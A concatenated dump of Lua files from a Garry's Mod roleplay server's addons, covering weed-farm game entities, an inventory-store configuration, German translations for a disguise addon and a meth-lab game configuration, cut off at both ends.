		self:SetBodygroup(9,0)
	end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_mixer_bowl/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_mixpot.mdl"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Mixer Bowl"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_OPAQUE


function ENT:SetupDataTables()

    self:NetworkVar("Int", 0, "WeedID")
    self:NetworkVar("Float", 0, "WeedAmount")
    self:NetworkVar("Float", 1, "THC")

    if (SERVER) then
        self:SetWeedID(-1)
        self:SetWeedAmount(0)
        self:SetTHC(0)
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_outlet/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	self.Cached_Rope = false
	self.RopeRefresh = true
	self.LastPowerLevel = -1

	self.Output01 = nil
	self.Output02 = nil
	self.Output03 = nil

	zwf.f.EntList_Add(self)
end

function ENT:Draw()
	self:DrawModel()


	zwf.f.UpdateEntityVisuals(self)
end

function ENT:Think()
	if zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 1000) then

		local _Output01 = self:GetOutput01()
		local _Output02 = self:GetOutput02()
		local _Output03 = self:GetOutput03()

		if self.Output01 ~= _Output01 then
			self.Output01 = _Output01

			if IsValid(self.Output01) then
				self:SetBodygroup(1,1)
			else
				self:SetBodygroup(1,0)
			end
		end

		if self.Output02 ~= _Output02 then
			self.Output02 = _Output02

			if IsValid(self.Output02) then
				self:SetBodygroup(2,1)
			else
				self:SetBodygroup(2,0)
			end
		end

		if self.Output03 ~= _Output03 then
			self.Output03 = _Output03

			if IsValid(self.Output03) then
				self:SetBodygroup(3,1)
			else
				self:SetBodygroup(3,0)
			end
		end
	else

		self.Output01 = nil
		self.Output02 = nil
		self.Output03 = nil
	end
end


function ENT:UpdateVisuals()

	if IsValid(self.Output01) then
		self:SetBodygroup(1,1)
	else
		self:SetBodygroup(1,0)
	end

	if IsValid(self.Output02) then
		self:SetBodygroup(2,1)
	else
		self:SetBodygroup(2,0)
	end

	if IsValid(self.Output03) then
		self:SetBodygroup(3,1)
	else
		self:SetBodygroup(3,0)
	end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_outlet/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_outlets.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Outlet"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:SetupDataTables()
    self:NetworkVar("Int", 0, "Power")
    self:NetworkVar("Entity", 0, "PowerSource")
    self:NetworkVar("Entity", 1, "Output01")
    self:NetworkVar("Entity", 2, "Output02")
    self:NetworkVar("Entity", 3, "Output03")

    if (SERVER) then
        self:SetPower(0)
        self:SetPowerSource(NULL)
        self:SetOutput01(NULL)
        self:SetOutput02(NULL)
        self:SetOutput03(NULL)
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_packingstation/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_packingstation.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Packing Station"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:SetupDataTables()
    self:NetworkVar("Int", 0, "PlantID")
    self:NetworkVar("String", 0, "WeedName")

    self:NetworkVar("Int", 1, "JarCount")
    self:NetworkVar("Vector", 0, "GamePos")
    self:NetworkVar("Int", 2, "GameStage")

    self:NetworkVar("Bool", 0, "AutoPacker")

    if (SERVER) then
        self:SetPlantID(-1)
        self:SetJarCount(0)
        self:SetGamePos(Vector(0,0,0))
        self:SetGameStage(-1)
        self:SetAutoPacker(false)
    end
end


function ENT:OnHitButton(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    local LGP = self:GetGamePos()


    if lp.x < (LGP.x + 1) and lp.x > (LGP.x - 4) and lp.y < (LGP.y + 3) and lp.y > (LGP.y - 3) then
        return true
    else
        return false
    end
end


function ENT:OnRemoveButton(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.y > -9.5 and lp.y < 9.5 and lp.x < -18.3 and lp.x > -24 and lp.z < 42 and lp.z > 41 then
        return true
    else
        return false
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_pot/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)
	self.Cached_Rope = false
	self.RopeRefresh = true

	self.PlantData = nil
	self.NutritionData = {
		name = "nil",
		b_speed = 0,
		b_amount = 0,
		b_plague = 0
	}

	self.LastSeed = -1
	self.LastWater = -1

	self.HasSoil = false

	self.Grow_Duration = -1

	self.LastWaterSource = nil

	self.HasPlagueEffect = false
end

function ENT:Think()

	zwf.f.LoopedSound(self, "zwf_plant_plague", self.HasPlagueEffect )

	if zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 1000) then

		local seed = self:GetSeed()
		if seed ~= self.LastSeed then

			self.LastSeed = seed

			if self.LastSeed == -1 then
				self.PlantData = nil
				self.Grow_Duration = -1
			else

				self.PlantData = zwf.config.Plants[self.LastSeed]

				local growBoost = self:GetPerf_Time() - 100
				self.Grow_Duration = self.PlantData.Grow.Duration * (1 - ((1 / 100) * growBoost))
				self.Grow_Duration = math.Clamp(self.Grow_Duration,zwf.config.Growing.min_duration,99999999)
			end

			self:UpdateDirt()
		end


		local _soil = self:GetHasSoil()
		if self.HasSoil ~= _soil then
			self.HasSoil = _soil

			if self.HasSoil then
				self:SetBodygroup(1,1)
			else
				self:SetBodygroup(1,0)
			end


			self:UpdateDirt()
		end

		local _water = self:GetWater()
		if self.LastWater ~= _water then

			self.LastWater = _water


			self:UpdateDirt()
		end

		local _plague = self:GetHasPlague()
		if self.HasPlagueEffect ~= _plague then

			self.HasPlagueEffect = _plague


			if self.HasPlagueEffect then
				zwf.f.ParticleEffectAttach("zwf_flys", PATTACH_POINT_FOLLOW, self, 0)

			else
				self:StopParticlesNamed("zwf_flys")
			end
		end
	else

		self.LastWater = -1
		self.HasSoil = -1

		if self.HasPlagueEffect == true then
			self.HasPlagueEffect = false
			self:StopParticlesNamed("zwf_flys")
		end

		self.NutritionData = nil


		self.LastSeed = -1
	end
end



function ENT:UpdateVisuals()

	if self.HasSoil then
		self:SetBodygroup(1,1)
	else
		self:SetBodygroup(1,0)
	end

	self:UpdateDirt()
end

function ENT:UpdateDirt()
	local MinWaterLevel , MaxWaterLevel

	if self.PlantData and self.LastSeed ~= nil and self.LastSeed ~= -1 then
		MinWaterLevel , MaxWaterLevel = zwf.f.Flowerpot_GetWaterLevels(self)
	else
		MinWaterLevel = zwf.config.Flowerpot.Water_Capacity * 0.1
		MaxWaterLevel = zwf.config.Flowerpot.Water_Capacity * 0.9
	end

	if self.LastWater > MaxWaterLevel then
		self:SetSkin(1)
	elseif self.LastWater < MinWaterLevel then
		self:SetSkin(2)
	else
		self:SetSkin(0)
	end
end

function ENT:Draw()
	self:DrawModel()

	zwf.f.UpdateEntityVisuals(self)

	if GetConVar("zwf_cl_vfx_drawui"):GetInt() == 1 and zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 500) then
		self:DrawUI()
	end
end

function ENT:DrawUI()
	local Pos = self:GetPos() + self:GetUp() * 8 + self:GetRight() * -15
	local Ang = self:GetAngles()

	Ang:RotateAroundAxis(self:GetRight(),90)
	Ang:RotateAroundAxis(self:GetForward(),90)
	Ang:RotateAroundAxis(self:GetUp(),-90)

	local _nutritionID = self:GetNutritionID()
	local _light = self:GetLight()
	local _progress = self:GetProgress()
	local _temperatur = self:GetTemperatur()





	if _nutritionID ~= -1 then
		if self.NutritionData == nil  then
			local nutData = zwf.config.Nutrition[_nutritionID]

			local b_speed = 0
			local b_amount = 0
			local b_plague = 0

			for k, v in pairs(nutData.boost) do
				if v.b_type == 1 then
					b_speed = b_speed + v.b_amount
				elseif v.b_type == 2 then
					b_amount = b_amount + v.b_amount
				elseif v.b_type == 3 then
					b_plague = b_plague + v.b_amount
				end
			end

			self.NutritionData = {
				name = nutData.name,
				b_speed = b_speed,
				b_amount = b_amount,
				b_plague = b_plague,
			}
		end
	else
		self.NutritionData = nil
	end



	cam.Start3D2D(Pos, Ang, 0.1)

		//BG
		draw.RoundedBox(5, -90 , -90, 180, 150,  zwf.default_colors["gray01"])

		local _harvestReady = self:GetHarvestReady()
		local _hasplague = self:GetHasPlague()


		draw.RoundedBox(2, -85 , 10, 170, 20,  zwf.default_colors["black04"])
		if self.PlantData and self.LastSeed ~= nil and self.LastSeed ~= -1 then

			if _hasplague then
				draw.RoundedBox(2, -85 , 10, 170, 20, zwf.default_colors["red02"])
				draw.SimpleText(zwf.language.General["plant_infected"], "zwf_flowerpot_font01", 0, 19,  zwf.default_colors["black01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

			elseif _harvestReady and zwf.config.Growing.PostGrow.Enabled then
				draw.RoundedBox(2, -85 , 10, 170, 20, zwf.default_colors["orange02"])
				draw.SimpleText(zwf.language.General["plant_postgrow"], "zwf_flowerpot_font01", 0, 19, zwf.default_colors["black01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

			else
				if _progress > 0 then
					local progressBar = (170 / self.Grow_Duration) * _progress
					draw.RoundedBox(2, -85 , 10, math.Clamp(progressBar,0,170), 20,  zwf.default_colors["green03"])
				end
			end

			draw.SimpleText(self:GetSeedName(), "zwf_flowerpot_font01", 0, -70, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		else
			draw.SimpleText(zwf.language.General["plant_empty"], "zwf_flowerpot_font01", 0, -70, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end

		draw.RoundedBox(2, -85 , 35, 170, 20,  zwf.default_colors["black04"])
		if self.LastWater > 0 then
			local waterbar = (170 / zwf.config.Flowerpot.Water_Capacity) * self.LastWater
			draw.RoundedBox(2, -85 , 35, math.Clamp(waterbar,0,170), 20,  zwf.default_colors["water"])
		end

		if self.PlantData and self.LastSeed ~= nil and self.LastSeed ~= -1 then

			// Water Level Info
			draw.SimpleText(zwf.language.General["Bad"], "zwf_flowerpot_font03", -80, 45, zwf.default_colors["white01"], TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)
			draw.SimpleText(zwf.language.General["Bad"], "zwf_flowerpot_font03", 80, 45, zwf.default_colors["white01"], TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)
			draw.SimpleText(zwf.language.General["Good"], "zwf_flowerpot_font03", 0, 45, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

			local MinWaterLevel , MaxWaterLevel = zwf.f.Flowerpot_GetWaterLevels(self)

			local wMinBar = (170 / zwf.config.Flowerpot.Water_Capacity) * MinWaterLevel

			local wMaxBar = (170 / zwf.config.Flowerpot.Water_Capacity) * MaxWaterLevel

			draw.RoundedBox(0, wMinBar - 85, 35, 2, 20, zwf.default_colors["white02"])
			draw.RoundedBox(0,  wMaxBar - 85, 35, 2, 20,zwf.default_colors["white02"])


			// State
			if self:GetHasPlague() then
				surface.SetDrawColor(zwf.default_colors["white01"])
				surface.SetMaterial(zwf.default_materials["plant_infected"])
				surface.DrawTexturedRect(-30, -55, 60, 60)
				draw.NoTexture()
			else
				if self.LastWater < MinWaterLevel or self.LastWater > MaxWaterLevel or _temperatur > 25 or  _light <= 0 then
					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["plant_sad"])
					surface.DrawTexturedRect(-30, -55, 60, 60)
					draw.NoTexture()

				elseif _harvestReady then
					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["plant_harvestready"])
					surface.DrawTexturedRect(-30, -55, 60, 60)
					draw.NoTexture()

				else
					surface.SetDrawColor(zwf.default_colors["white01"])
					surface.SetMaterial(zwf.default_materials["plant_happy"])
					surface.DrawTexturedRect(-30, -55, 60, 60)
					draw.NoTexture()
				end
			end
		end



		// Temperatur
		local tFract = (1 / 30) * _temperatur
		local tempColor = zwf.f.LerpColor(tFract, zwf.default_colors["blue01"], zwf.default_colors["red04"])
		_temperatur = 10 + _temperatur
		draw.SimpleText(_temperatur .. "c", "zwf_flowerpot_font04", -58, -25, tempColor, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

		surface.SetDrawColor(zwf.default_colors["white03"])
		surface.SetMaterial(zwf.default_materials["temperatur"])
		surface.DrawTexturedRect(-87, -55, 60, 60)
		draw.NoTexture()


		// Light
		if _light > 0 then

			surface.SetDrawColor(zwf.default_colors["yellow01"])
			surface.SetMaterial(zwf.default_materials["sun"])
			surface.DrawTexturedRect(38, -43, 40, 40)
			draw.NoTexture()
		else
			surface.SetDrawColor(zwf.default_colors["white03"])
			surface.SetMaterial(zwf.default_materials["sun"])
			surface.DrawTexturedRect(38, -43, 40, 40)
			draw.NoTexture()
		end


		// Nutrition info
		if _nutritionID ~= -1 and self.NutritionData ~= nil and _harvestReady == false then
			local info = ""

			if self.NutritionData.b_speed > 0 then
				info = info .. zwf.language.General["Speed"] .. ": +" .. self.NutritionData.b_speed .. "% "
			end

			if self.NutritionData.b_amount > 0 then
				info = info .. " | " .. zwf.language.General["Productivity"] .. ": +" .. self.NutritionData.b_amount .. "% "
			end

			if self.NutritionData.b_plague > 0 then
				info = info .. " | " .. zwf.language.General["AntiPlague"] .. ": +" .. self.NutritionData.b_plague .. "% "
			end

			local aSize = 6 * string.len(info)
			draw.RoundedBox(5, -aSize / 2, -118, aSize, 25, zwf.default_colors["gray01"])
			draw.RoundedBox(5, -80, -145, 160, 30, zwf.default_colors["gray01"])
			draw.SimpleText(self.NutritionData.name, "zwf_flowerpot_font02", 0, -130, zwf.default_colors["power"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			draw.SimpleText(info, "zwf_flowerpot_font03", 0, -105, zwf.default_colors["power"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		end

	cam.End3D2D()
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:OnRemove()
	self:StopSound("zwf_plant_plague")
end

--PATH addons/itemstore_new/lua/itemstore/config.lua:
itemstore.config.MaxStack = 5

itemstore.config.LimitToJobs = {}

itemstore.config.DataProvider = "mysql"

itemstore.config.SaveOnWrite = true

itemstore.config.GamemodeProvider = "darkrp"

itemstore.config.SaveInterval = 180

itemstore.config.Language = "ru"

itemstore.config.ContextInventory = true

itemstore.config.ContextInventoryPosition = "bottom"

itemstore.config.EnableInvholster = false

itemstore.config.InvholsterTakesAmmo = false

itemstore.config.SplitWeaponAmmo = false

itemstore.config.PickupsGotoBank = false

itemstore.config.PickupDistance = 100

itemstore.config.DropDistance = 100

itemstore.config.PickupKey = IN_DUCK

itemstore.config.TradingEnabled = false

itemstore.config.TradeCooldown = 60

itemstore.config.TradeDistance = 0

itemstore.config.DeathLoot = false

itemstore.config.DeathLootTimeout = 60 * 5

itemstore.config.BoxBreakable = false

itemstore.config.BoxHealth = 100

itemstore.config.IgnoreOwner = true

itemstore.config.AntiDupe = true

itemstore.config.MigrateOldData = false

itemstore.config.UseNewUI = true

itemstore.config.LoadDelay = 5

itemstore.config.PrintLog = false

itemstore.config.VerboseLogging = false

itemstore.config.bLogs = false

itemstore.config.Skin = "flat"

itemstore.config.ChatCommandPrefix = "/"

itemstore.config.InventorySizes = {
	default = { 8, 2, 1 },
	vip = { 10, 2, 1 },
	moder = {10, 3, 1 },
	padmin = { 10, 4, 1 },
	sponsor = { 10, 5, 1 },
	dsuperadmin = { 10, 6, 1 },
	downer = { 10, 7, 1 },
	["NS-trainee"] = { 8, 2, 1 },
	["NS-mlmoder"] =  { 10, 2, 1 },
	["NS-moder"] =  { 10, 2, 1 },
	["NS-mladmin"] =  { 10, 2, 1 },
	["NS-admin"] = { 9, 3, 1 },
	["NS-helper"] = { 9, 3, 1 },
	["NS-assistant"] = { 10, 3, 1 },
	overwatch = { 10, 4, 1 },
	["NS-zammanager"] = { 10, 5, 1 },
	manager = { 10, 8, 1 },
	uprav = { 10, 10, 1 }
}

itemstore.config.BankSizes = {
	default = { 8, 4, 2 },
}

itemstore.config.Colours = {
	Slot = Color( 0, 0, 0, 150 ),
	HoveredSlot = Color( 255, 255, 255, 150 ),
	Title = Color( 255, 255, 255 ),

	TitleBackground = Color( 0, 0, 0, 200 ),
	Upper = Color( 100, 100, 100, 100 ),
	Lower = Color( 30, 30, 30, 150 ),
	InnerBorder = Color( 0, 0, 0, 0 ),
	OuterBorder = Color( 0, 0, 0, 200 )
}

-- The style of the item highlight. Options are "old", "border", "corner", subtle" and "full"
itemstore.config.HighlightStyle = "subtle"

-- Highlight colours for the various types of items. 
itemstore.config.HighlightColours = {
	Weapons = Color( 231, 76, 60 ),
	Ammo = Color( 241, 196, 15 ),
	Shipments = Color( 230, 126, 34 ),
	Factories = Color( 52, 152, 219 ), -- printers, gunlabs, microwaves, etc
	Consumables = Color( 26, 188, 156 ), -- drugs, food
	Money = Color( 46, 204, 113 ),
	Other = Color( 236, 240, 241 ), -- never delete this!
}

itemstore.config.DisabledItems = {
	drug = false,
	drug_lab = false,
	food = false,
	gunlab = false,
	microwave = false,
	money_printer = false,
	spawned_food = true,
	spawned_shipment = false,
	spawned_weapon = false,
	spawned_money = true,
	zck_snowballswep = true,
	-- weapons
	weapon_defibrilator = true,
    fadmin_jail = true,
    meteor = true,
    door = true,
    func_ = true,
    player = true,
    beam = true,
	bobi = true,
	burger = true,
	fish = true,
	kompot = true,
	kumis = true,
	ponch = true,
    worldspawn = true,
    env_ = true,
    path_ = true,
    prop_physics = true,
	vc_jerrycan = true,
	weapon_crossbow = true,
	weapon_frag = true,
	vc_wrench = true,
	weapon_rpg = true,
	weapon_slam = true,
    prop_dynamic = true,
    prop_vehicle_prisoner_pod = true,
    gmod_button = true,
    gmod_rtcameraprop = false,
    gmod_cameraprop = true,
    gmod_dynamite = false,
	npc_grenade_frag = true,
    gmod_light = true,
    gmod_lamp = false,
    gmod_emitter = false,
	rp_radio = true,
	bit_miner_light = true,
	bit_miner_heavy = true,
	bit_miner_medium = true,
	weapon_slam = true,
	weapon_frag = true,
	sent_soccerball = true,
	selfportrait_camera = true,
	durgz_cigarette = true,
	durgz_alcohol = true,
	durgz_lsd = true,
	durgz_pcp = true,
	durgz_water = true,
	durgz_weed = true,
	durgz_aspirin = true,
	durgz_cocaine = true,
	durgz_heroine = true,
	durgz_meth = true,
	durgz_narko = false,
	weapon_mad_2b = true,
	zwf_seed = true,
	zwf_seed_bank = true,
	zmlab_meth = true,
	zmlab_meth_baggy = true,
	cocaine_box = true,
	weapon_ar2 = true,
	weapon_flechettegun = true,
	fakepass = true
}

itemstore.config.CustomItems = {
	durgz_narko = { "Наркотик", "Нужно для продажи Артуру", true },
	burger = { "Гамбургер", "Сэндвич из рубленой жареной котлеты", true },
	kompot = { "Компот", "Десертный напиток из фруктов!", true },
	kumis = { "Кумыс", "Кисломолочный напиток из кобыльего молока.", true },
	ponch = { "Пончик", "обычно сладкий пирожок с дыркой посередине",  true },
	fish = { "Жареная Рыба", "Из Японии, вкусная полезная, питательная",  true },
	bobi = { "Бобы", "Восхитительный, подобный ореху вкус.",  true },
	fs_apple = { "Яблоко", "Вкусное, сладкое, прямиком с фермы.",  true },
	fs_cabbage = { "Капуста", "Питательное, полезное, прямиком с фермы.",  true },
	fs_lemon = { "Лемон", "Питательное, полезное, прямиком с фермы.",  true },
	fs_melon = { "Дыня", "Питательное, полезное, прямиком с фермы.",  true },
	fs_orange = { "Апельсин", "Питательное, полезное, прямиком с фермы.",  true },
	fs_watermelon = { "Арбуз", "Питательное, полезное, прямиком с фермы.",  true },
	fs_potato = { "Картошка", "Питательное, полезное, прямиком с фермы.",  true },
	fs_tomato = { "Помидор", "Питательное, полезное, прямиком с фермы.",  true }
}

itemstore.config.InvholsterDisabled = {
    ["m9k_harpoon"] = true
}

--PATH addons/deceive/lua/deceive/translations/de.lua:
-- Translation by [GrGr]Michi (http://steamcommunity.com/id/GrGrMichi/)

return {
	-- UI

	disguise_ui_title				= "Deceive - Verkleiden",

	disguise_ui_row_name			= "Name",
	disguise_ui_row_job 			= "Job",

	disguise_ui_info_player 		= "Spieler:",
	disguise_ui_info_job 			= "Job:",
	disguise_ui_info_gunlicensed	= "Waffenlizenz:",
	disguise_ui_info_wanted			= "Gesucht:",
	disguise_ui_info_arrested		= "Arrestiert:",

	disguise_ui_yes 				= "Ja",
	disguise_ui_no 					= "Nein",

	disguise_ui_action				= "Verkleiden",

	disguise_ui_undisguise1			= "/%s zum Enttarnen",
	disguise_ui_undisguise2			= "Lege den Befehl auf eine Taste, um dich schnell enttarnen zu können(In die Konsole: bind 'beliebige Taste' '%s')",

	disguise_ui_invalid_target		= "Dein Ziel ist nicht mehr gültig!",

	-- Server notifications

	disguise_successful				= "Du hast dich erfolgreich als %s getarnt.",
	disguise_removed 				= "Du hast dich enttarnt.",

	disguise_removed_jobchange		= "Deine Verkleidung wurde entfernt, da du deinen Job gewechselt hast.",
	disguise_warn_disconnect 		= "WARNUNG: Der Spieler, als der du verkleidet warst, hat soeben den Server verlassen!",
	disguise_blown					= "Deine Tarnung ist aufgeflogen, da du eine Waffe abgefeuert hast!",

	disguise_cooldown				= "Du kannst dich wieder in %s verkleiden.",
	disguise_disallowed_as			= "Du kannst dich nicht, mit deinem derzeitige Job, verkleiden. (%s)",
	disguise_disallowed_to			= "Du kannst dich nicht als diese Person verkleiden, wegen ihrem Job. (%s)",
	disguise_self 					= "Du kannst dich nicht, als du selber verkleiden...",
	disguise_none 					= "Du hast keine Verkleidung!",

	disguise_drawer_usedup			= "Dem Drawer sind die Verkleidungskits ausgegangen!",

	-- Disguise SWEP help

	swep_disguise_briefcase 		= "Kleidungskoffer",
	swep_disguise_briefcase_title	= "Deceive - Verkleiden",
	swep_disguise_briefcase_text	= "Verkleide dich mit den Kleidungsstücken, die in diesem Kleidungskoffer enthalten sind. Täusche deine Umgebung und bringe Chaos in die Welt!",
	swep_disguise_briefcase_help1	= "Links Klick: Öffne das Verkleidungsmenü",
	swep_disguise_briefcase_help2	= "Nachladen: Enttarnen",
}


--PATH addons/zeros_methlab2/lua/zmlab2/sh_main_config.lua:
zmlab2 = zmlab2 or {}
zmlab2.config = zmlab2.config or {}

/////////////////////////////////////////////////////////////////////////////

// Bought by 76561199494289420
// Version 	11 march 2023

/////////////////////////// Zeros Methlab 2 /////////////////////////////

// Developed by ZeroChain:
// http://steamcommunity.com/id/zerochain/
// https://www.gmodstore.com/users/view/76561198013322242
// https://www.artstation.com/zerochain

/////////////////////////////////////////////////////////////////////////////

// Used for debugging the script
zmlab2.config.Debug = false

// Should we use FastDL instead of the workshop contentpack?
zmlab2.config.FastDl = false

// What language should we display en , fr , de , ru , es , pl , tr , ptbr , cz
zmlab2.config.SelectedLanguage = "ru"

// The Currency
zmlab2.config.Currency = "$"

// Should the Currency symbol be in front or after the money value?
zmlab2.config.CurrencyInvert = true

// Unit of weight
zmlab2.config.UoM = "g"

// Chat command for dropping collected meth crates
zmlab2.config.DropMeth = "!dropmeth"

// Chat command for getting meth out of a crate in to a bag
zmlab2.config.BagMeth = "!bagmeth"


// These Ranks are admins
// If xAdmin, sAdmin or SAM is installed then this table can be ignored
zmlab2.config.AdminRanks = {
	["superadmin"] = true,
	["uprav"] = true
}

// If set to false then only the owner of the entity can interact with it
zmlab2.config.SharedEquipment = false

// You can use this to restrict what job is allowed to interact with the Methlab Entities / Sell Meth (Leave empty to allow everyone to interact)
zmlab2.config.Jobs = {}
if TEAM_ZMLAB2_COOK then zmlab2.config.Jobs[TEAM_ZMLAB2_COOK] = true end


// Defines how much health each entity has before it gets destroyed (-1 disables the damage)
zmlab2.config.Damageable = {
	["zmlab2_machine_ventilation"] = 200,
	["zmlab2_storage"] = 200,
	["zmlab2_machine_furnace"] = 200,
	["zmlab2_machine_mixer"] = 200,
	["zmlab2_machine_filter"] = 200,
	["zmlab2_machine_filler"] = 200,
	["zmlab2_machine_frezzer"] = 200,
	["zmlab2_table"] = 200,

	["zmlab2_item_acid"] = 15,
	["zmlab2_item_aluminium"] = 15,
	["zmlab2_item_lox"] = 25,
	["zmlab2_item_methylamine"] = 25,

	["zmlab2_item_meth"] = 15,
	["zmlab2_item_crate"] = 15,
	["zmlab2_item_palette"] = 50,
}


////////////// CONSTRUCTION
zmlab2.config.Equipment = {

	// How much money does the player get back when removing a machine? (This also gets used when a tent gets deconstructed and all machines inside get removed)
	Refund = 0.5, // 1 = 100%, 0.5 = 50%

	// Should the equipment be untouchable by the physgun?
	PhysgunDisabled = false,

	// Can the player collide with the Equipment / Machines
	PlayerCollide = true,

	// If set to true then the EquipmentBox will only display a repair button
	RepairOnly = false,

	// If set to false then the player can build / place machines anywhere
	RestrictToTent = true,
}


////////////// POLLUTION
zmlab2.config.PollutionSystem = {
	// Should the machines start to pollute the area once they produce meth?
	Enabled = false,

	// Multiplies the produced pollution amount (The more a area is poluted, the more damage a player gets and the longer it takes to dissipate the pollution)
	Multiplier = 1,

	// How much pollution evaporates / dissapears per second?
	EvaporationAmount = 8,

	// Performs a trace for a more realistic result but costs more performance.
	UseTraces = true,

	// How much damage does pollution inflict per second (Damage ranges between min / max depending on pollution amount)
	Damage = {min = 1,max = 10},

	// You can use this to make certain players immune against the poison gas, So there will be no damage or screen effect
	ImmunityCheck = function(ply)

		// If you enable this check then superadmins are immune against the poison gas
		//if ply:IsSuperAdmin() then return true end

		// You can write something like that to check if the player is wearing a GasMask Accessory, (Requieres SHAccessory)

		// If you gonna check for a player model (hazmat) then make sure you define the original model path the model was compiled for
		// aka the path that gets returned via :GetModel() and not the path the model is currently located
		// You can find a guide for this here > https://www.gmodstore.com/help/addon/7033/common-issues-3/topics/zbl-config-protectioncheck-not-working-correctly-for-models
	end,

	AmountPerMachine = {
		// Every second while acid gets heated
		["Furnace_Cycle"] = 4,

		// Every second while Ingredients getting mixed
		["Mixer_Cycle"] = 4,

		// Every second while the meth getting refined
		["Filter_Cycle"] = 6,

		// Every second while the meth is getting filled on the trays
		["Filler_Cycle"] = 4,

		// Every second while the meth is getting frozen
		["Frezzing_Cycle"] = 4,
	}
}

zmlab2.config.Ventilation = {

	// How long is the output pipe
	Hose_length = 300,

	// How large is the cleaning area of the Ventilation system
	Radius = 100,

	// Defines how much pollution can be moved per second
	// (Having a low value means the player would need multiple ventilation machines to keep the area clear of pollution)
	AmountPerSecond = 20,
}


////////////// PRODUCTION
zmlab2.config.MiniGame = {

	// This can be used to increase the amount of minigames 1 = normal, 2 = double (Currently this only impacts the minigame count for the Filter Machine)
	OccurrenceMultiplier = 1,

	// How long after the error occured does the player have time to respond
	RespondTime = 5,

	// How much will the quality of meth decrease if the player fails the MiniGame
	Quality_Penalty = 10,

	// How much will the quality increase if the player wins the mini game
	Quality_Reward = 5,

	// Defines some chances for chaos events when failing a minigame
	Punishment = {
		// How high is the chance that the machine will create a large burst of pollution
		Pollu_Chance = 50, // 50%
		// At which meth difficulty level does this punishment occure
		Pollu_Difficulty = 1,
		// How much pollution should be instantly greated
		Pollu_Amount = 100,

		// Ignites the machine
		Fire_Chance = 25,
		Fire_Difficulty = 3,
		Fire_Duration = 10,

		// Explodes the machine
		Explo_Chance = 15,
		Explo_Difficulty = 7,
	}
}

zmlab2.config.Storage = {
	// How often can a player buy something from the storage
	BuyInterval = 0.4, // seconds
}

zmlab2.config.Furnace = {
	// How many acid container does the furnace need
	Capacity = 3,

	// How long does it take to heat the acid
	HeatingCylce_Duration = 60,
}

zmlab2.config.Filler = {
	// How long does it take to fill a tray
	Fill_Time = 3,
}

zmlab2.config.Frezzer = {
	// How much meth fits on a tray
	Tray_Capacity = 250,

	// Should we draw a indicator on the tray to show its current state?
	Tray_DisplayState = true,

	// How long does it take for one frezze cycle to complete
	Time = 60,

	// How often can the frezzer be used before he needs a new lox tank
	Lox_Usage = 5,
}

zmlab2.config.Packing = {
	// How fast can a player break ice
	Manual_IceBreak_Interval = 0.5,

	// How fast can the auto breaker upgrade for the packing table break ice
	Auto_IceBreak_Interval = 0.4,
}

zmlab2.config.Crate = {
	Capacity = 2500,
}

zmlab2.config.Palette = {
	// How many transport crates fit on the palette
	Limit = 32,
}


////////////// SELLING
zmlab2.config.NPC = {

	Name = "Скупщик мета",

	// The Model of the Meth Buyer
	Model = "models/Humans/Group03/male_07.mdl",

	// What Sell mode do we want? (Can be dynamicly changed using the zmlab2_GetSellMode Hook)
	SellMode = 2,
	// 1 = Methcrates can be collected by Players and sold by the MethBuyer on use
	// 2 = Methcrates cant be collected and the MethBuyer tells you a dropoff point instead
	// 3 = Methcrates can be collected and the MethBuyer tells you a dropoff point
	// 4 = Methcrates need to be moved to the MethBuyer and sold directly by him

	// Can be used to multiply the earned money depending on Player rank (If you wanna modify the earned money by any other means use the zmlab2_PreMethSell Hook)
	SellRanks = {
		["default"] = 1, // < DONT REMOVE THIS, This value gets used if the players rank could not be found in the table
		["user"] = 1,
		["superadmin"] = 2,
	},
}

zmlab2.config.DropOffPoint = {

	// The Time in seconds before Dropoff Point closes.
	DeliverTime = 120,

	// The Time in seconds till you can request another dropoff point.
	DeliverRequest_CoolDown = 300,

	// Should the meth crate icon be visible?
	Draw_Icon = true,

	// Should the countdown timer be visible?
